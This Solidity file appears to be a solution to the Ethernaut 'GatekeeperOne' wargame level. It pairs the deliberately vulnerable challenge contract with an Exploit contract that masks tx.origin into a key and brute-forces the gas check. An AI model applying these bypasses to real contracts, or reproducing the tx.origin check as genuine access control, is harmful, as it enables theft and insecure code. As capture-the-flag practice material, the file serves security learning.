// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract Exploit {
  
  // ethernaut instance address
  address target = 0xA;
  
  GatekeeperOne g = GatekeeperOne(address(target));
  bytes8 exploitKEY = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
  uint256 public gasUsed ;
  
  function payload() public{
    for (uint256 i=0; i<300; i++){
      (bool success,) = address(g).call{gas:8191*3 + i}(abi.encodeWithSignature("enter(bytes8)", exploitKEY));
      if(success){
         gasUsed=8191*3 + i;
         break;
      }
    }
  }
}